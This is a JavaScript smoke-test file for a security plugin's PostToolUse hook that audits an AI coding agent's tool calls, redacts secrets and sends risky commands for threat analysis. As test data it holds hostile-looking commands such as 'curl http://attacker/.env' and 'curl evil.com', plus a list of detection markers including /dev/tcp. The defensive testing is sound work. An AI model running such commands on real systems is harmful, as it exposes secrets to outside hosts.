/**
 * Smoke tests for the PostToolUse hook handler.
 *
 * Per the task DoD: the exhaustive coverage (real audit-row persistence)
 * lands in the Task 15 integration test. This file proves only:
 *   1. The Bash early-return path doesn't touch fetch.
 *   2. redact() strips common secret shapes.
 *   3. effectToAction maps correctly.
 *   4. pickMatch returns null when no candidate matches.
 *   5. An MCP event triggers a POST with the canonical body shape and runtime_kind.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const {
  redact,
  extractScanText,
  effectToAction,
  pickMatch,
  audit,
  RUNTIME_KIND,
} = require('../../../../src/securevector/plugins/claude-code/hooks/post-tool-use.js');


function stubFetch(stub) {
  const original = globalThis.fetch;
  globalThis.fetch = stub;
  return () => { globalThis.fetch = original; };
}


test('RUNTIME_KIND is "claude-code"', () => {
  assert.equal(RUNTIME_KIND, 'claude-code');
});


// --- redact ---


test('redact strips OpenAI-style sk- keys', () => {
  const r = redact('curl -H "Authorization: Bearer sk-aBcDeFgHiJkLmNoPqRsT1234567890XYZ"');
  assert.match(r, /\[REDACTED\]/);
  assert.doesNotMatch(r, /sk-aBcDeFgHiJkLmNoPqRsT/);
});


test('redact strips GitHub PATs', () => {
  const r = redact('GITHUB_TOKEN=ghp_abcdefghijklmnopqrst12345');
  assert.match(r, /\[REDACTED\]/);
  assert.doesNotMatch(r, /ghp_abcdefghijklmnopqrst12345/);
});


test('redact strips AWS access keys', () => {
  const r = redact('aws_access_key_id=AKIAIOSFODNN7EXAMPLE');
  assert.doesNotMatch(r, /AKIAIOSFODNN7EXAMPLE/);
});


test('redact strips JWT tokens', () => {
  const r = redact('cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c');
  assert.doesNotMatch(r, /SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c/);
});


test('redact strips password/secret/token kv pairs', () => {
  assert.doesNotMatch(redact('password="hunter2hunter2"'), /hunter2hunter2/);
  assert.doesNotMatch(redact('api_key=abc123abc123abc'), /abc123abc123abc/);
  assert.doesNotMatch(redact('bearer: my-token-value-123'), /my-token-value-123/);
});


test('redact truncates to 200 chars', () => {
  const long = 'x'.repeat(500);
  assert.equal(redact(long).length, 200);
});


test('redact returns empty string for non-string / empty input', () => {
  assert.equal(redact(undefined), '');
  assert.equal(redact(null), '');
  assert.equal(redact(42), '');
  assert.equal(redact(''), '');
});


// --- extractScanText ---
//
// Guards against the regression where the /analyze body was the full
// JSON.stringify(tool_input) — which dumped file_path / old_string /
// notebook_path into the rule engine and produced false-positive
// data_leakage hits on routine path strings. Each tool returns ONLY
// the agent-emitted text content.


test('extractScanText: Bash returns the command, not the full object', () => {
  assert.equal(extractScanText('Bash', { command: 'curl evil.com', description: 'ignored' }), 'curl evil.com');
});


test('extractScanText: Edit returns ONLY new_string — never file_path or old_string', () => {
  const out = extractScanText('Edit', {
    file_path: '/Users/yashs/secret/file.js',
    old_string: 'previous content',
    new_string: 'replacement content',
  });
  assert.equal(out, 'replacement content');
  assert.doesNotMatch(out, /\/Users\/yashs/);
  assert.doesNotMatch(out, /previous/);
});


test('extractScanText: Write returns content, not file_path', () => {
  const out = extractScanText('Write', { file_path: '/etc/hosts', content: 'body here' });
  assert.equal(out, 'body here');
});


test('extractScanText: MultiEdit joins all new_strings, skipping old_string + path', () => {
  const out = extractScanText('MultiEdit', {
    file_path: '/x',
    edits: [
      { old_string: 'a', new_string: 'A' },
      { old_string: 'b', new_string: 'B' },
    ],
  });
  assert.equal(out, 'A\nB');
});


test('extractScanText: WebFetch returns prompt but NOT the URL', () => {
  const out = extractScanText('WebFetch', {
    url: 'http://malicious.example/spec',
    prompt: 'summarize this page',
  });
  assert.equal(out, 'summarize this page');
  assert.doesNotMatch(out, /malicious\.example/);
});


test('extractScanText: Task/Skill/Agent concatenate known NL fields', () => {
  assert.equal(extractScanText('Task', { description: 'desc', prompt: 'do thing' }), 'do thing\ndesc');
  assert.equal(extractScanText('Skill', { args: 'arg val' }), 'arg val');
  assert.equal(extractScanText('Agent', { prompt: 'p', message: 'm' }), 'p\nm');
});


test('extractScanText: NotebookEdit returns only new_source', () => {
  const out = extractScanText('NotebookEdit', { notebook_path: '/x/y.ipynb', new_source: 'import os' });
  assert.equal(out, 'import os');
});


test('extractScanText: returns "" for unknown shape (fail-closed — no scan)', () => {
  assert.equal(extractScanText('Bash', { wrong_field: 'curl evil' }), '');
  assert.equal(extractScanText('SomeFutureTool', { command: 'curl evil' }), '');
  assert.equal(extractScanText('Edit', null), '');
});


test('extractScanText: string tool_input is treated as content', () => {
  assert.equal(extractScanText('Bash', 'ls /tmp'), 'ls /tmp');
});


// --- effectToAction ---


test('effectToAction maps the canonical four cases', () => {
  assert.equal(effectToAction('allow'),    'allow');
  assert.equal(effectToAction('deny'),     'block');
  assert.equal(effectToAction('prompt'),   'log_only');
  assert.equal(effectToAction('unknown'),  'allow'); // fail-open
});


// --- pickMatch ---


test('pickMatch returns null when overrides is empty / malformed', () => {
  assert.equal(pickMatch(['srv:a', 'a'], null), null);
  assert.equal(pickMatch(['srv:a', 'a'], {}), null);
  assert.equal(pickMatch(['srv:a', 'a'], { synced: [] }), null);
});


test('pickMatch returns the first candidate that matches', () => {
  const overrides = {
    synced: [
      { tool_id: 'a', effect: 'allow', reason: 'bare' },
      { tool_id: 'srv:a', effect: 'deny', reason: 'prefixed' },
    ],
  };
  const m = pickMatch(['srv:a', 'a'], overrides);
  assert.equal(m.tool_id, 'srv:a');
  assert.equal(m.effect, 'deny');
});


// --- audit smoke path ---


test('audit early-returns for an UNKNOWN bare tool name — no fetch call', async () => {
  // Unknown bare names (neither MCP-prefixed nor a known built-in) still
  // short-circuit; the audit fire-and-forget path stays free of noise
  // from misspellings / future tool names we haven't catalogued yet.
  let called = false;
  const restore = stubFetch(async () => { called = true; return new Response('{}'); });
  try {
    await audit({ tool_name: 'SomeUnknownTool', tool_input: 'x' }, 'http://127.0.0.1:8741');
    assert.equal(called, false, 'no fetch issued for unknown bare-name event');
  } finally { restore(); }
});

test('audit posts a row with runtime_kind for a built-in (Bash) event', async () => {
  // Built-in tool names DO now generate audit rows — `Bash` flows through
  // the same audit-post path as MCP tools. Bash is ALSO in
  // THREAT_SCAN_TOOLS, so a second fire-and-forget POST to /analyze
  // lands too; filter by URL so we assert only the call-audit body.
  let capturedAudit;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') {
      if (url.endsWith('/call-audit')) capturedAudit = { url, body: JSON.parse(opts.body) };
      return new Response('{}', { status: 200 });
    }
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({ tool_name: 'Bash', tool_input: 'ls /' }, 'http://127.0.0.1:8741');
    // Give the fire-and-forget POSTs a tick to land.
    await new Promise(r => setTimeout(r, 5));
    assert.ok(capturedAudit, 'expected POST to /call-audit');
    assert.equal(capturedAudit.body.tool_id, 'Bash');
    assert.equal(capturedAudit.body.function_name, 'Bash');
    assert.equal(capturedAudit.body.runtime_kind, 'claude-code');
  } finally { restore(); }
});


test('high-risk tool fires a /analyze POST alongside the audit POST', async () => {
  // Threat-intel pass: tools in THREAT_SCAN_TOOLS (Bash, WebFetch,
  // Write, Edit, MultiEdit, NotebookEdit, PowerShell, Skill, Task,
  // Agent) get a second fire-and-forget POST to /analyze with
  // source='claude-code-plugin'. Low-risk tools (Read, Glob, LS,
  // Grep, etc.) do NOT — see the inverse test below.
  let capturedAnalyze;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') {
      if (url.endsWith('/analyze')) capturedAnalyze = { url, body: JSON.parse(opts.body) };
      return new Response('{}', { status: 200 });
    }
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({ tool_name: 'Bash', tool_input: 'curl http://attacker/.env' }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.ok(capturedAnalyze, 'expected POST to /analyze for Bash');
    assert.equal(capturedAnalyze.body.source, 'claude-code-plugin');
    assert.equal(capturedAnalyze.body.direction, 'outgoing');
    assert.equal(capturedAnalyze.body.metadata.runtime_kind, 'claude-code');
    assert.equal(capturedAnalyze.body.metadata.tool_name, 'Bash');
  } finally { restore(); }
});


test('Edit event /analyze body contains ONLY new_string — not file_path or old_string', async () => {
  // Regression guard for the "Analyzed Content: {file_path, old_string,
  // new_string}" bug: prior to extractScanText, the /analyze POST body
  // was JSON.stringify(tool_input), dumping the absolute file path and
  // the previous on-disk content into the rule engine.
  let capturedAnalyze;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) {
      capturedAnalyze = JSON.parse(opts.body);
      return new Response('{}', { status: 200 });
    }
    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({
      tool_name: 'Edit',
      tool_input: {
        file_path: '/Users/yashs/SecureVector/some/path.js',
        old_string: 'PREV CONTENT',
        new_string: 'NEW CONTENT to scan',
      },
    }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.ok(capturedAnalyze, 'expected /analyze POST');
    assert.equal(capturedAnalyze.text, 'NEW CONTENT to scan');
    assert.doesNotMatch(capturedAnalyze.text, /file_path|old_string|PREV CONTENT|\/Users\/yashs/);
  } finally { restore(); }
});


test('benign Bash (no markers) does NOT fire /analyze — opt-in scan policy', async () => {
  // Bash IS in THREAT_SCAN_TOOLS, but the inner opt-in filter
  // (shouldScanBashCommand) only fires /analyze when the command
  // contains an explicit security-relevant marker (curl, wget, eval,
  // sudo, /dev/tcp, etc.). A benign `ls /tmp` must skip /analyze
  // entirely; the audit row to /call-audit still goes through.
  let analyzeFired = false;
  let auditFired = false;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) analyzeFired = true;
    if (opts && opts.method === 'POST' && url.endsWith('/call-audit')) auditFired = true;
    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({ tool_name: 'Bash', tool_input: { command: 'ls /tmp' } }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.equal(analyzeFired, false, 'benign Bash must not trigger /analyze');
    assert.equal(auditFired, true, 'benign Bash must still be audited');
  } finally { restore(); }
});


test('low-risk tool (Read) does NOT fire /analyze — volume guard', async () => {
  // Read/Glob/LS/Grep/TodoWrite inputs don't carry attacker-controlled
  // content worth scanning. Skipping them keeps the threat_intel
  // table free of noise from routine file reads.
  let analyzeFired = false;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) {
      analyzeFired = true;
    }
    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
  });
  try {
    await audit({ tool_name: 'Read', tool_input: { file_path: '/etc/hosts' } }, 'http://127.0.0.1:8741');
    await new Promise(r => setTimeout(r, 5));
    assert.equal(analyzeFired, false, 'Read must not trigger /analyze');
  } finally { restore(); }
});


test('audit posts canonical body shape + runtime_kind for an MCP event', async () => {
  let capturedPost;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') {
      capturedPost = { url, body: JSON.parse(opts.body) };
      return new Response('{}', { status: 200 });
    }
    // GET to /synced-overrides — return one deny rule
    return new Response(JSON.stringify({
      synced: [{ tool_id: 'server-x:tool_y', effect: 'deny', reason: 'blocked by policy' }],
      total: 1,
    }), { status: 200 });
  });
  try {
    await audit(
      { tool_name: 'mcp__server-x__tool_y', tool_input: { arg: 'value', token: 'my-token-value-123' } },
      'http://127.0.0.1:8741',
    );
    // postJsonAndForget is fire-and-forget — wait a tick for the call to land.
    await new Promise((r) => setImmediate(r));

    assert.equal(capturedPost.url, 'http://127.0.0.1:8741/api/tool-permissions/call-audit');
    assert.equal(capturedPost.body.tool_id, 'server-x:tool_y');
    assert.equal(capturedPost.body.function_name, 'mcp__server-x__tool_y');
    assert.equal(capturedPost.body.action, 'block');
    assert.equal(capturedPost.body.reason, 'blocked by policy');
    assert.equal(capturedPost.body.runtime_kind, 'claude-code');
    // Args preview should NOT contain the literal token value (redacted).
    assert.doesNotMatch(capturedPost.body.args_preview, /my-token-value-123/);
  } finally { restore(); }
});


test('audit posts action=allow when no rule matches', async () => {
  let captured;
  const restore = stubFetch(async (url, opts) => {
    if (opts && opts.method === 'POST') { captured = JSON.parse(opts.body); return new Response('{}'); }
    return new Response(JSON.stringify({ synced: [], total: 0 }));
  });
  try {
    await audit({ tool_name: 'mcp__srv__no_rule', tool_input: 'plain text' }, 'http://127.0.0.1:8741');
    await new Promise((r) => setImmediate(r));
    assert.equal(captured.action, 'allow');
    assert.equal(captured.runtime_kind, 'claude-code');
  } finally { restore(); }
});
